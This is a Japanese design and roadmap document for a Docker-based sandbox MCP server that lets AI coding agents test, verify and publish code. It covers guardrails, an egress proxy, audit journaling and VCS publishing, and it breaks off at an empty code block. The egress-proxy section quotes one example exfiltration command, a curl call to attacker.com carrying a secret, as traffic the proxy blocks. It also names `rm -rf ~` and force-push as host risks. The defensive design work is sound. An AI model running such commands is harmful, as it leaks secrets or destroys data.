# Code Sandbox MCP — 設計方針・機能ロードマップ

> 位置づけ: これは「Dockerを操作するMCP」ではなく、**AIが最小限のコンテキストで安全にテスト・検証・提出を実行できる基盤**。
> 機能を増やすことが目的ではなく、トークン消費を抑え・推論精度を保ち・人間の最終制御を残すことを優先する。

## 設計の根本目標

**セキュリティを高めながら、可能な限りローカル相当の利便性を実現する。**

通常、セキュリティと利便性はトレードオフになる。権限を広げれば便利になり、絞れば不便になる。このMCPはサンドボックス（Dockerコンテナ）を中間層として置くことでこのトレードオフを回避する設計思想を持つ。

- AIから見た利便性: ローカル作業と変わらない操作感・速度
- ホストへの影響: 構造的に遮断、ホスト側シェル権限をオフにできる

「sandboxで完結できないならツールの問題」という姿勢はここから来ている。不便を感じた時点でそれはMCPの改善issueであり、ローカル直接作業への逃げは設計の失敗を隠蔽する。この目標は機能追加・変更の意思決定において常に判断軸となる。

---

## 0. 基本思想

- **AI-first**: 全部見せない / 生データではなく構造を返す / 段階的に詳細化する。
- **サンドボックス境界による安全 + 事後監査**: 守るべき線は「危険な操作か?」ではなく **「サンドボックスの外に出る操作か?」**。コンテナ内は使い捨てなので中で何が起きても消えるだけ（中の任意コマンドはゲートしない）。境界を越える操作（永続ボリューム/ホストマウント/ネットワーク/外部VCS書き込み）だけを §2 の静的ガードレールで構造的に塞ぐ。それでも防ぎきれない部分は §8 の append-only 実行ジャーナルで**事後に追える**ことを安全網の主役にする。
- **クリーン環境優先**: 状態共有による高速化より、再現性・安全性・デバッグ容易性を優先。原則は使い捨て環境。
- **リスク階層**: AI にホストを直接操作させるリスクは最大（`rm -rf ~` / `git push --force` / SSH鍵流出の経路が無制限）。コンテナに隔離すれば、何をされても使い捨てで消える。この MCP の価値の半分は **「できないことの保証」** にある — ネットワーク off 既定 / 非 root 強制 / VCSトークン opt-in の三重ロックで、AI の暴走が境界を越える経路を構造的に塞いでいる。
- **ホスト権限の最小化（承認疲れ防止）**: サンドボックスなしで AI がホスト上で作業すると、Bash/PowerShell の承認プロンプトが頻発する。ユーザーは承認疲れで全許可にしてしまい、結果として AI がホスト上で何でもできる状態になる。この MCP を使うことで実作業をコンテナ内に集約し、ホスト側のシェル権限をオフのまま維持できる。**MCP があることでホスト権限を絞れる**、というのが本来の設計意図であり、ローカル直接作業はその恩恵を自ら壊す。
- **スコープの線引き**: このMCPは「テスト・検証・提出（publish）まで回すサンドボックス」。**コード理解レイヤーの自前実装は引き続き §1 で除外**。外部VCSへの提出（push/PR/issue取得）は、コンテナ内クローンに対する**境界越え操作**として §2.2 の条件下でのみ許可。ユーザのローカル作業ツリーは §5 の通り対象外のまま。
- **組織化プリミティブ = セッション**: すべてのツールは「Docker操作」ではなく **ライブなセッション（コンテナ＋FS＋run履歴を持つ作業空間）に対する操作** として設計する。機能の所属は常に **「それはセッション状態に対する操作か?」** で判定する（Yes＝入れる / 横断的なコード理解はNo＝§1で切る）。
- **affordance**: インストール済み ≠ 使われる。LLM はツールリストに**動詞として載っている能力**しか常用しない（Claude Code が bash を持ちつつ Grep/Edit/Glob を別ツールとして出しているのが傍証）。「使わせたい操作」は first-class ツールにする。**ただし §1/§5 の非増殖と両立**させ、first-class 化は「常用させたい動詞」に限る（残りはイメージ同梱＋exec）。

---

## 1. スコープ判断（あえてやらないこと）

線引きを明確にして発散を防ぐ。判定基準は§0の通り **「ライブなセッションに対する操作か?」**、および **「インデックス/埋め込みストア/コードグラフを所有・永続化するか?」**。

- **コード理解レイヤーの自前実装** → **このMCPに入れない。**
  基準は能力ではなく「**インデックス/埋め込みストア/コードグラフを所有・永続化するか**」。
  - **入れない（所有・永続化が必要）**: 埋め込みベースのセマンティック検索 / code-RAG ストア / 永続コードグラフ。既存 code-RAG MCP と丸かぶりし保守が膨張する。必要なら**別リポジトリ**。
  - **入れてよい（使い捨てコンテナ内で完結する CLI）**: ripgrep / ast-grep（構造検索＋書換）/ ctags 等。MCP は状態を持たず、生成物はコンテナ破棄で消えるため「自前で抱える」に当たらない。セマンティック検索は CLI 形が無いので自動的に外側へ落ちる。
- **`snapshot_container` / `restore_from_snapshot`** → 後回し（クリーン環境思想と矛盾）。
- **`create_network` / `expose_port_temporarily` / `estimate_cost`** → 後回し。Composeで足りる領域はComposeに寄せる。
- **コンテナ内任意コマンドの「危険度判定」ゲート** → **入れない。** 自己申告に依存して構造的に強制できない。守るのは境界越え操作のみ（§2）。
- **Tool Auto Discovery / Intelligent Test Runner** → 北極星（ビジョン）として保持。
- **外部VCS の広域運用（管理）** → **入れない。** issue 一覧管理・レビュースレッド運用・projects 連携等は GitHub MCP の領分。
- **レビューの実行**（#475 で追加）→ **入れる。** PR のチェックアウト・検証・所見作成・投稿を変更ライフサイクルの一部として扱う。ただし「管理」（スレッド解決・運用）は上記の通り GitHub MCP のまま。経緯は §15（設計決定ログ）を参照。

---

## 2. セキュリティ（土台 / Phase 0・非機能）

機能ではなく**最初のコミットから入っている前提**。実行時の承認UIではなく「静的ガードレール」。**守る対象はサンドボックスの境界を越える操作に限定する**。

### 2.1 静的ガードレール（マージ済み）
- 非root実行（`--user`）を既定強制。
- `--privileged` 禁止。
- `/var/run/docker.sock` 等の危険ソケットのマウント拒否。
- ホストマウントはホワイトリスト制限。
- memory / CPU / pids 制限、ネットワークは既定 off。
- 再現性のため **imageはタグでなくダイジェスト固定**（`image@sha256:...`）。

### 2.2 境界越え操作のトークン必須（Phase 0 拡張）
**「危険操作の承認」という発散した枠組みは捨てる。** 残すのは、サーバが専用ツールとして所有していて構造的に強制できるものだけ。

**対象（write 系・トークン必須）**
- 永続ボリュームの削除 / 永続リソースの削除 / ホストマウント変更 / ネットワーク変更。
- **外部VCS への書き込み**: `git push` / PR作成 / PRコメント / リモートブランチ削除。
- 方式: 該当ツールは一発実行（V1.0 で `dry_run`＋確認トークンの二段階は廃止）。人間ゲートは MCP クライアント自身のツール承認に一本化し、構造的防御は egress proxy（allowlist＋短命の認可ウィンドウ）が担う。二段階トークン／`sandbox_approve`・`sandbox_reject`・`sandbox_approval_status` は前提（HITL が唯一の防御）が egress proxy 成熟で失効したため撤去した。

**対象（read 系・ネットワーク許可＋記録のみ）**
- **外部VCS からの読み取り**: `gh issue view` / `gh pr view` 等は破壊的でないため二段階トークン不要。ただし外部ネットワークなので §8 ジャーナルに必ず記録し、ネットワーク既定 off に対する明示許可フラグ配下で実行。

**原則**: 外に書くものはトークン必須、外から読むものは記録のみ。どちらも §8 ジャーナルに残す。

**非対象**: コンテナ内の任意コマンド（使い捨てサンドボックス内で完結するためゲートしない。§8 ジャーナルで事後追跡）。

### 2.3 egress proxy（構造ガードの本体）

「危険操作の承認」を捨てた以上、**構造ガードの実体は egress proxy**である。posture A（#495: 封じ込めを本物にする）に基づき、以下の3層で構成する。層は直交しており、上の層が下の層を代替しない。

| 層 | 何を止めるか | 実装 | 設定 |
|---|---|---|---|
| ① 経路の封じ込め | SSH・任意 TCP・直接 IP 宛の egress。コンテナは internal network 上にあり、外に出る唯一の経路が HTTP(S) proxy | `internal=True` の Docker network + sidecar | （常時） |
| ② 宛先の default-deny | allowlist 外のホストへの到達そのもの。`curl https://attacker.com/?d=secret` は 403（#506） | proxy の `EgressGuard.decide_host()` | `SUNABA_ALLOWED_EGRESS_HOSTS`（組み込み既定に**加算**。`*` で無効化） |
| ③ 書き込み先の allowlist | allowlist 外リポジトリへの push / API write。到達可能でも書き込み権限は別問題 | proxy の push / read / api-write 認可ウィンドウ（#356 / #419 / #420） | `SUNABA_ALLOWED_REPOS` |

**default-on / fail-closed（#509）**: `allow_network=True` のセッションでは proxy が**既定で有効**。明示的な opt-out は `SUNABA_ENABLE_EGRESS_PROXY=false`。sidecar の起動に失敗した場合は `sandbox_initialize` 自体を失敗させる（fail-closed）。「ON のつもりが実は素通し」という #495 が問題視した状態を構造的に作らないための選択であり、sidecar 起動失敗で全セッションが止まるリスクは意図的に受け入れている。

**設定変更の反映（#533）**: sidecar は上記の env を**起動時に一度だけ**読む長寿命コンテナ（`restart_policy=unless-stopped`）。そのため `ensure_egress_proxy()` は再利用時に sidecar の焼き込み env を `docker inspect` で読み戻し、現在の設定と食い違えば**作り直す**。CA は named volume に永続する（#400）ので再作成は稼働中サンドボックスを壊さない。手で `docker rm` する運用手順は存在しない。

**既知の限界**: ② は allowlist 内ホスト経由の exfil（許可済みリポジトリの issue に秘密を書く等）や DNS/SNI サイドチャネルを止めない。casual/arbitrary な egress に対する構造的バリアであって、完全な情報フロー境界ではない（#507 で明記済み）。

---

## 3. トークン削減（LLM視点）

**反復ループ全体での削減**を主眼にする。系統は **(1)状態をサーバに置く (2)全文でなく差分を返す (3)返す前にノイズを削る**。

### 3.1 状態はサーバ側、LLMは「ハンドル」を持つ
- **`run_id` を全結果の起点にする。** 「続きのログ」「失敗したテストだけ再実行」を巨大な再投入なしに参照できる。
- **大きな成果物はインライン展開しない。** カバレッジ・生成物・大JSONは `resource://run/123/coverage (1.2MB)` のようにサイズ付きハンドルで返す（MCP resource）。
- **`issue_view` もハンドル方式**: issue 本文をコンテナ内ファイルへ落とし、LLM には要約＋ハンドルのみ返す。全文は `read_file_range` で必要時に。

### 3.2 全文ではなく「差分」を返す（反復ループの本命）
- [x] **失敗のフィンガープリント＋重複圧縮**: 同型失敗は `×N` に畳む（`compress_failures`）。
- ~~コンテンツアドレスな結果キャッシュ~~: V1.0 の棚卸し（#457 / #459）で削除。default-deny 運用下ではヒット率が低く、鮮度バグの温床だった（#329 / #382）。再導入するなら `package_install` 内部などツール局所で。
- **`publish` の差分も非通過**: diff はコンテナ内で完結し、LLM には差分サマリ＋ハンドルのみ返す。

### 3.3 返す前にデノイズ
- ANSIカラー・タイムスタンプ・`\r` 進捗バーを除去。`CI=true` / `--no-color` 等を強制。
- **ライブラリフレームの剪定**: `site-packages` / pytest内部を落とし、ユーザコードのフレームに圧縮。
- **成功はほぼ無料に**: all-passなら `{status: ok, passed: 120, duration: 4.2s}` の一行だけ。

### 3.4 補助
- [x] **トークン予算パラメータ**: `max_output_tokens` を渡すと枠に収まるよう要約し「続きはこのハンドル」（`truncate_by_tokens`）。
- **コマンドのバッチ実行**: `[cmd1, cmd2, cmd3]` を1コールで。

### 原則（必須）
**既定は差分・要約、ただしフルは常にハンドルで取得可能（offset/limitで逃げ道を必ず残す）。**

---

## 4. 構造化テスト結果（本丸）

5000行のログではなく結果を返す。AI-firstの核心。

```json
{
  "status": "failed",
  "duration": 12.3,
  "passed": 120,
  "failed": 2,
  "failures": [
    { "test": "test_login", "error": "AssertionError", "file": "auth/login.py", "line": 42 }
  ]
}
```

- **v1は pytest / jest / go test の3つを"ちゃんと"対応。**
  - pytest: `pytest-json-report` + `--json-report`
  - jest: `jest --json`
  - go test: `go test -json`

---

## 5. Edit/Verify サブシステム（最小編集ループ）

> 位置づけ: **テストが失敗したときに、その場で少しだけ効率よく直して再検証するためだけ**のツール群。§4の構造化失敗（`file:line`付き）を入力に、最小の修正→再検証を回すことだけが目的。

**独立性の設計**: §0のセッションプリミティブ上に乗る**独立サブシステム**。ただし **同一サーバ内に同居**（別サーバにするとコンテナハンドルを失う）。

**コア（これだけでループが閉じる）**
- **`search_in_container`**: `mode: lexical|structural` で ripgrep / ast-grep を切り替え。`{file, line, text}` 配列を返す。`max_results` 上限付き。理想ループの起点。
- **`read_file_range`**: `offset` / `limit` で該当箇所だけ読む。
- **`write_file_sandbox`（編集の主役）**: 既知の新テキストを渡す宣言的編集。`overwrite` / 行範囲 / `append` / `old_str`（文字列置換）の各モードを束ねる。LLM 著作編集の既定経路。
- **`lint_in_container` / `type_check_in_container`**: 編集ループ中の単体（単一ファイル）確認用。ruff / pyright。`lint_in_container` は `fix=True` で `ruff check --fix` / `eslint --fix` を対象ファイルに適用し、修正後に残った findings を返す（#284。autofix は単一ファイル限定で、プロジェクト全体の scope フェーズは読み取り専用のまま）。
- **`verify_in_container`**: 公開前の品質ゲート。pytest の前に lint（プロジェクトの `src/` を素の `ruff check` で。CI と一致）と型チェックを**前提条件**として実行し、どちらかが落ちればテストを走らせず `gate_passed=false` と findings を返す（#293。lint 忘れが CI まで漏れない）。ツール不在（例: `:minimal` イメージ）は `lint_type_incomplete` 扱いでゲートは落とさない。`test_filter`（pytest `-k`）で特定テストだけ実行可能。フィルタ合格時は自動で全件テストを実行し、gate は常に全件ベースで判定。テストランナーは pytest 固定ではなく、検出したプロジェクト言語に応じて pytest（Python）/ jest（JS/TS）/ go test（Go）へディスパッチする（#493、`edit_verify._DISPATCH`）。結果に `diff_summary` を含める。これは `git diff --stat` の**文字列ではなく**、`git diff --numstat` + `--name-status` を解析した構造化 JSON（`unstaged` / `staged`、ファイルごとの追加・削除行数と変更種別）である（#500）。

**編集の2モダリティ（宣言的 / 命令的の直交2本）**

編集は「新バイト列を*渡す*」か「*計算するコードを渡す*」かの直交2本に集約する（§0 affordance の非増殖原則）。

- **宣言的 = `write_file_sandbox`**（上記コア）: 新テキストが既知のとき。点編集の主役。
- **命令的 = `transform_file`**: 新バイト列をコードで計算するとき（regex 一括 / 構造書換 / 計算的編集 / 機械生成 diff の `git apply`）。`code` は**単一トップレベル文字列**で受け内部 base64 化（multibyte/改行のエスケープ問題を構造的に回避）、**結果 diff を返す**ことで read-modify-write-verify を一体化（サイレント破壊の可視化）。#268 で `verify.py` から `file.py` へ移管、ファイル編集ツール群との統合を反映。
- **`apply_patch` は削除済み**: かつて「主役」と位置づけたが誤り。LLM 手書き unified diff は失敗率が高く、失敗時の往復で**トークン経済が反転する**。「フルファイル送信比で1〜2桁削減」は baseline が誤りで、真の競合は `old_str`（そこに対しペイロード優位はほぼ無く、コンテキスト行ぶん出力が増えることすらある）。`apply_patch` は `mcp.tool()` 登録を削除済み（#259）。機械生成 diff の適用は `transform_file` の `git apply` 経路を使用する。

**二次（需要が出てから）**
- `sd`（テキスト/設定/Markdown の正規表現置換）/ `ast-grep`(rewrite)（コード構造書換）。`transform_file` の内部実装に吸収可。§1改訂の通りコンテナ内 CLI なので可。
- `format_in_container` / `tree_in_container` / `git_diff_in_container`。

**ファイル操作（`tools/file.py`）**

コア4点とは別に、コンテナ内ファイルの一覧とホスト→コンテナの転送を担うツール群。`read_file_range` / `write_file_sandbox` / `transform_file` と同じ `tools/file.py` に同居する。

- `list_files`: `find` ベースでコンテナ内ファイルを一覧。`path` / `max_depth` / `pattern` フィルタ付き。
- `copy_file`: 単一ローカルファイルをコンテナへ転送（`local_src_file` → `dest_path`）。
- `copy_project`: ローカルディレクトリ（またはファイル）を tar アーカイブでコンテナへ転送（`local_src_dir` → `dest_dir`）。

転送はホスト→コンテナの片方向のみ。コンテナ→ホストの逆流は持たない（§5 スコープ境界・§0 リスク階層）。

**スコープ境界**: 対象は使い捨てサンドボックス内のファイルのみ。ユーザの実リポジトリ作業ツリーは対象外。**コア4点が主役**、二次は後追い。

**理想ループ（最小コンテキスト）**
```
search_in_container → read_file_range → write_file_sandbox(old_str) | transform_file → lint_in_container → type_check_in_container → verify_in_container → publish
```

`search_in_container` はデフォルトでリポジトリルートを検索対象とし（従来の `path="/"` からの変更）、戻り値には切り詰めメタデータを含む（§6b）。

---

## 6. 出力制御

- `verbose`: `error_only` / `summary` / `full`（既定 `summary`）。
- トランケート＋メタデータ: `{ "shown": 20, "total_lines": 5000, "truncated": true }`。
- ページング: `offset` / `limit`、レスポンスに `next_offset` / `has_more`。
- 終了コード≠0 / stderrありの場合はエラー周辺を多めに含める。

### 6a. エラー契約（Issue #467）

全ツールのエラー戻り値は以下の単一形状に統一する:

```json
{"status": "error", "error": "<人間可読なメッセージ>"}
```

ツール固有の追加フィールド（例: `verify_in_container` の `gate_passed`）は許容する。
エラー時は `status` と `error` の2フィールドを常に含むこと。

**該当ツール一覧:**

| ツール | 変更内容 |
|--------|---------|
| `search_in_container` | `[{"error":...}]` → `{"status":"error","error":"..."}` |
| `lint_in_container` | 偽 finding (`rule:"error"`) → `{"status":"error","error":"..."}` |
| `type_check_in_container` | 同上 |
| `verify_in_container` | `gate_passed` は維持、`status` ＋ `error` を追加 |
| `checkpoint` / `checkpoint_list` / `checkpoint_restore` | `{"error":...}` → `{"status":"error","error":"..."}` |
| `clone_repo` | 同上 |
| `issue_view` / `sandbox_issue_write` | 同上 |
| `list_files` / `read_file_range` | 同上 |
| `publish` | 同上（status ありと混在していたものを統一）|
| `sandbox_exec` / `sandbox_exec_background` / `sandbox_exec_check` | 元から `{"status":"error","error":"..."}` 準拠。変更不要 |
| `package_install` | 同上。変更不要 |

### 6b. 検索結果の出力制御（Issue #469）

`search_in_container` は切り詰めを明示するメタデータを返す:

```json
{"matches": [...], "shown": 20, "total": 150, "truncated": true, "next_offset": 20}
```

| フィールド | 意味 |
|-----------|------|
| `matches` | 該当行の配列（各要素: `file`, `line`, `text`） |
| `shown` | 実際に含めた件数（`max_results` 以下） |
| `total` | 見つかった件数（`max_results` 超過時は推定値を含む） |
| `truncated` | 切り詰めが発生したか |
| `next_offset` | 次のページを取得するためのオフセット（`truncated=true` 時のみ） |

---

## 7. トランスポート（タイムアウト対策）

> **問題**: stdio ベース MCP トランスポートにはクライアント側で ~60秒のタイムアウトがかかる。Docker の `pull`, `build`, 大規模 `put_archive` などがこの制限を超える。

**解決**: FastMCP がサポートする HTTP ベースのトランスポート（SSE / HTTP / streamable-HTTP）に切り替えることでクライアント側のタイムアウト制約を回避する。

### 選択肢

| トランスポート | タイムアウト | 特徴 |
|---------------|-------------|------|
| `stdio`（既定） | ~60秒 | シンプル、全クライアント対応、launcher が stdio プロキシ |
| `sse`（推奨） | なし | Server-Sent Events、HTTP 永続接続、クライアントが SSE をサポートする必要あり |
| `http` | なし | 標準 HTTP、ステートレスに近い |
| `streamable-http` | なし | MCP spec の Streamable HTTP、双方向ストリーミング |

### アーキテクチャ

`stdio` モードでは launcher が子プロセスの stdin/stdout/stderr をプロキシする2プロセス構成。`sse`/`http` モードではサーバが TCP ポートにバインドし、launcher はプロセスライフサイクル管理のみを行う。

```python
# server.py (抜粋)
transport = args.transport  # "stdio" | "sse" | "http" | "streamable-http"
if transport == "stdio":
    mcp.run(transport=transport)
else:
    mcp.run(transport=transport, host=args.host, port=args.port)
```

### 設定

```json
"--transport", "sse", "--host", "127.0.0.1", "--port", "8750"
```

`launcher` モードでも `--transport sse` を指定可能。launcher は stdio プロキシを省略し、サーバプロセスのみ管理する。

### 補足

- `sandbox_exec_background` + `sandbox_exec_check` のバックグラウンド実行パターンは引き続き利用可能（SSE 下でも有用）。
- `_ensure_image()` の `docker pull` がタイムアウトする問題は、SSE 移行により解消される（pull 中にクライアントがタイムアウトしなくなる）。

---

## 8. 事後監査が安全網の主役（旧 HITL）

> 旧 §7「実効性のある承認」は廃止。コンテナ内の任意コマンドは構造的に強制できない。だが**サンドボックス内は使い捨てなのでゲート不要**（§0）。本当に強制すべき境界越え操作は §2.2 に統合済み。

人間の最終制御は「実行前の承認」から **「事後に追える監査」** に重心を移す。

---

## 9. 人間が把握しやすい仕組み（可観測性 / 監査）

§8の通り安全網の主役はここ。**実装の最優先はジャーナル**。

- **人間可読の append-only 実行ジャーナル（最優先）**: `tail -f ~/.sunaba/journal.log` で「いつ・どのimageで・何を・実行結果サマリ・境界越え操作なら承認の有無・外部VCS操作の内容」が自然文で流れる。全実行を漏れなく記録。改竄しにくい append-only を厳守。
  100MB に達すると `journal.log.1` へ自動退避し、ディスク使用量は最大約 200MB に抑制される。
  退避後も同一ファイルへの追記は続かず、新しい `journal.log` が作られる。
  読み取りは両ファイル (`journal.log.1` → `journal.log`) を透過的に結合する。退避より前の履歴も消えない。
- **run_id 単位のリプレイ可能トレース出力（HTML / JSON）**: 事後に「なぜそう動いたか」を共有・レビュー。
  最大 100 ファイルまで保持し、超過時は古いものから削除される。
- **ローカルWebダッシュボード（localhost限定 / read-only / 自動更新）**: 稼働コンテナ・run履歴・pass/fail・リソース使用量を一目で。二段階トークン撤去（§2.2）により承認キューは存在しない。ダッシュボードは事後監査の面であって、実行時ゲートの面ではない。
- **プッシュ通知（OS通知 / Webhook）**（`notify.py`）: 境界越え操作・失敗閾値超え（既定5回）・長時間実行（既定300秒）のときだけ。OS デスクトップ通知は Linux `notify-send` / macOS `osascript` / Windows PowerShell の3OS対応、Webhook は設定 URL への HTTP POST。閾値・宛先は CLI 引数 `--webhook-url` / `--failure-threshold` / `--long-run-seconds` で調整する。
- **実行前の人間向けプラン表示**: `publish` で対象ブランチ・差分サマリ・上書き有無を提示。

> 注意: ダッシュボードは localhost 限定＋必要なら認証。

### 9.1 ツール別記録マトリクス（Issue #359 対応）

すべてのツールはジャーナルにエントリを記録**しなければならない**。
記録がないツールは監査ギャップ（trace に現れない）と #229 ダッシュボードの
集計不整合（`bypass_rate_pct` の過大評価）の原因となる。

| ツール | 記録種別 | operation | 補足 |
|--------|----------|-----------|------|
| `sandbox_initialize` | `record_initialize` / `record_initialize_complete` | `initialize` / `initialize_complete` | — |
| `sandbox_exec` | `record_exec` | `exec` | — |
| `sandbox_exec_background` | `record_exec` (exit_code=-1) | `exec` | #361 で追加 |
| `sandbox_exec_check` | `record_tool_use` | `tool_use` | #454 で追加。ポーリング自体を可視化 |
| `run_container_and_exec` | `record_initialize` + （内部で `sandbox_exec` 利用）+ `record_stop` | initialize/exec/stop | — |
| `sandbox_stop` | `record_stop` | `stop` | — |
| `write_file_sandbox` | `record_file_write`（内部で `record_file_write` 呼び出し）| `write_file` | — |
| `transform_file` | `record_tool_use`（変更時は加えて `write_file`） | `tool_use` | #454 で追加。従来は変更時しか痕跡が残らなかった |
| `copy_project` | `record_copy` | `copy_project` | — |
| `copy_file` | `record_copy` | `copy_file` | — |
| `read_file_range` | `record_tool_use` | `tool_use` | #359 Tier 3 |
| `list_files` | `record_tool_use` | `tool_use` | #359 Tier 3 |
| `search_in_container` | `record_tool_use` | `tool_use` | #359 Tier 3 |
| `lint_in_container` | `record_tool_use` | `tool_use` | #359 Tier 3 |
| `type_check_in_container` | `record_tool_use` | `tool_use` | #359 Tier 3 |
| `verify_in_container` | `record_tool_use` | `tool_use` | #359 Tier 3 |
| `diff_in_container` | `record_tool_use` | `tool_use` | 読取専用（構造化 diff） |
| `package_install` | `record_exec` | `exec` | #361 で追加 |
| `issue_view` | `record_boundary_crossing`（approved=None）+ `record_exec`（内部で `gh` 呼び出し）| `boundary_crossing` | 読取専用 VCS |
| `clone_repo` | `record_boundary_crossing`（approved=None）+ `record_exec`（内部の gh clone）| `boundary_crossing` | 読取専用 VCS |
| `checkpoint` | `record_boundary_crossing`（approved=None） | `boundary_crossing` | 表を実装に合わせ修正（#454） |
| `checkpoint_list` | `record_tool_use` | `tool_use` | #454 で追加。読取専用 |
| `checkpoint_restore` | `record_boundary_crossing`（approved=None） | `boundary_crossing` | 表を実装に合わせ修正（#454） |
| `publish` | `record_boundary_crossing` | `boundary_crossing` | 境界越え（write、一発実行） |
| `sandbox_read_journal` | （なし） | — | 読取専用・opt-in（#460） |
| `sandbox_trace` | （なし） | — | 読取専用・opt-in（#460） |
| `sandbox_list_runs` | （なし） | — | 読取専用・opt-in（#460） |
| `sandbox_journal_path` | （なし） | — | 読取専用・opt-in（#460） |
| `sandbox_trace_dir` | （なし） | — | 読取専用・opt-in（#460） |
| `sandbox_issue_write` | `record_boundary_crossing` | `boundary_crossing` | 境界越え（write、一発実行） |
| `sandbox_pr_review_write` | `record_boundary_crossing` | `boundary_crossing` | 境界越え（write）。§14 レビューフローの投稿口 |
| `sandbox_attach` | `record_tool_use` | `tool_use` | #554 で追加。セッションの引き継ぎ点そのもの |
| `sandbox_list_containers` | （なし） | — | `container_id` 引数を持たない（下記） |

`sandbox_attach` は #478（コンテナ共有）の入口 —— **別セッション・別モデルが既存コンテナに接続してくる地点**である。ここが記録されないと、切り替わりの前後に操作エントリが並ぶだけで、**切り替わり自体を示すものが何もない**。`session_label`（#479）も同様で、ラベルは以降のエントリに付随するだけなので、記録が無ければラベル A の操作列とラベル B の操作列の境界を journal から復元できない。そのため `sandbox_attach` は `record_tool_use` を記録し、ラベルを張り替えた場合は `previous_session_label` を params に残す（#554）。

`sandbox_list_containers` は非計装。理由は「読取専用だから」**ではない**（`checkpoint_list` / `read_file_range` / `list_files` は読取専用でも記録する）。`container_id` 引数を持たない全体クエリであり、run_id はコンテナ単位で採番される（`get_or_create_run_id(container_id)`）ため、記録するには container に紐づかないイベントという新概念が要る。これは `sandbox_journal_path` / `sandbox_trace_dir` を非計装にしているのと同一の根拠である。

読取専用の journal/trace 5ツールは `SUNABA_OBSERVABILITY_TOOLS=1` のときだけ登録される（#460）。記録側（`record_*`）は無条件で動く基盤であり、集計はホスト側で journal.log を直読みすれば足りる。この5ツールは意図的に非計装（#454）: デフォルト無効の観測用デバッグ面であり、journal の読み取りを journal に書くのは自己言及ノイズになる（`sandbox_journal_path` / `sandbox_trace_dir` は container_id 引数自体を持たない）。

テストファイル: `tests/test_journal.py` に対応する単体テストを追加済み（#359 用の
`TestRecordToolUse` クラス）。新しいツールを追加するときは必ずテストも追加すること。

---

## 10. テスト環境クイックパス

V1.0 の棚卸し（#457 / #458）で削除。`run_test_environment` / `stop_test_environment` / `wait_for_condition` は実利用が無いまま休眠していたため、互換シム無しで撤去した（#438 と同方針）。多サービス統合テストは現状スコープ外。§2.1 の静的ガードレールにより `/var/run/docker.sock` 等のマウントは拒否され、コンテナ内に Docker デーモンも無いため、`sandbox_exec` から docker compose を実行することは構造的にできない。

---

### Environment variables

プロジェクト固有の環境変数は `SUNABA_*` prefix に統一する。
`GITHUB_*` / `GH_TOKEN` は GitHub エコシステム標準のため対象外。

旧名（`CSB_*`、`SHIORI_REPOS_PATH`）は V1.0 リリース後に削除予定。
各旧名はフォールバックとして読み取り、使用時は deprecation warning をログ出力する。

| 新名 | 旧名（deprecated） | 用途 |
|---|---|---|
| `SUNABA_OBSERVABILITY_TOOLS` | `CSB_OBSERVABILITY_TOOLS` | Observability ツール登録 |
| `SUNABA_TOKEN_BROKER_CACHE_DIR` | `CSB_TOKEN_BROKER_CACHE_DIR` | トークンブローカのキャッシュディレクトリ |
| `SUNABA_TOKEN_BROKER_NO_DOWNLOAD` | `CSB_TOKEN_BROKER_NO_DOWNLOAD` | トークンブローカのダウンロード抑止 |
| `SUNABA_SHIORI_REPOS_PATH` | `SHIORI_REPOS_PATH` | Shiori リポジトリルートへのホストパス |

**運用者が設定する変数**（旧名を持たない。§2.3 / §13.1 の実体）

| 変数 | 既定 | 用途 |
|---|---|---|
| `SUNABA_ENABLE_EGRESS_PROXY` | **on** | egress proxy の有効化。`false` で opt-out（#509 で意味が反転: opt-in → opt-out） |
| `SUNABA_ALLOWED_REPOS` | 空（全 push 拒否） | 書き込み先 allowlist（層③）。`owner/repo` のカンマ区切り |
| `SUNABA_ALLOWED_EGRESS_HOSTS` | 空（組み込み既定のみ） | 宛先ホスト allowlist（層②、#506）。組み込み既定に**加算**。`*` で封じ込め無効化 |
| `SUNABA_CONTAINER_TTL_SECONDS` | 0（無効） | アイドルコンテナの自動停止 TTL（§13.1、#480） |
| `SUNABA_PROXY_IMAGE` | pin → `sunaba/proxy:latest` | sidecar イメージの上書き（#432 の digest pin より優先） |
| `SUNABA_PROXY_CONTROL_HOST_PORT` | 8768 | control API の loopback 公開ポート |

`SUNABA_PROXY_CONTROL_URL` / `SUNABA_PROXY_CONTROL_SECRET` は `ensure_egress_proxy()` がプロセス env に**書き出す**動的変数であり、運用者が設定するものではない。

---

## 11. 外部VCS連携（issue→fix→verify→publish の自己完結）

> 位置づけ: edit/verify ループの**入口（課題取得）と出口（提出）**だけを足す。GitHub MCP を介さず payload をコンテキストに通さないことが唯一の狙い。

**ツール**

- **`issue_view`**（read）: issue 本文をコンテナ内ファイルへ落とし、LLM には**要約＋ハンドル**だけ返す（§3.1）。§2.2 read 扱い（ジャーナル記録・ネットワーク明示許可）。
- **`clone_repo`**（read / 入口）: 対象リポジトリをコンテナ内へ匿名 `git clone`（`repo` / `dest_dir` / `branch`；private は proxy の read 認可ウィンドウで認証、#419）。issue_view と並ぶ作業の起点。`sandbox_initialize(clone_repo=…)` / `run_container_and_exec(clone_repo=…)` でも起動と同時にクローンできる。§2.2 read 扱い（ネットワーク明示許可・ジャーナル記録）。
- **`publish`**（write / 境界越え）: コミット済みの状態を push し、任意で PR を作成する唯一の出口。verify は内蔵せず、LLM が `verify_in_container` で事前に行う。人間ゲートは MCP クライアントのツール承認、構造ガードは egress proxy（§2.2、二段階トークンは #438 で廃止）。§8 ジャーナルに結果を記録。

  **egress proxy 遮断時は Objects API にフォールバックしない（#401）**: git push のエラー出力に `"BLOCKED by egress proxy"` が含まれている場合、`publish` は Objects API（blob→tree→commit→ref）による代替 push を行わず、そのままエラーを返す。これは意図的な設計判断である。API フォールバックはホスト側から api.github.com を直接叩くため proxy をバイパスする — もし proxy 遮断時にフォールバックが発動すると、allowlist 未設定などの構成ミスが隠蔽され、「なぜか API 経由でのみ push される」状態で運用が続くリスクがある。エラーメッセージには `SUNABA_ALLOWED_REPOS` の設定が必要である旨のヒントを含める。

**認証（トークンはホスト側に留まる）**

VCS トークンはコンテナに一切注入されない（#439）。read（clone / PR チェックアウト）は egress proxy の read 認可ウィンドウ（#419）でネットワーク層認証し、write（push / PR / issue）は `publish` / `sandbox_issue_write` がホスト側でトークンを解決する。コンテナ自身の `git`/`gh` は常に無認証。

- 最小権限: コンテナにトークンが存在しないので、はぐれた in-container `git push` が漏らす credential がない。
- 漏洩低減: 実行ログは `sanitize_output` の `mask_tokens` で `KEY=***` に自動マスクされる。
- 構造ガード: read / push の認可はホストが proxy に per-grant でトークンを渡す。コンテナは credential を保持しない。

**payload 非通過フロー**

```
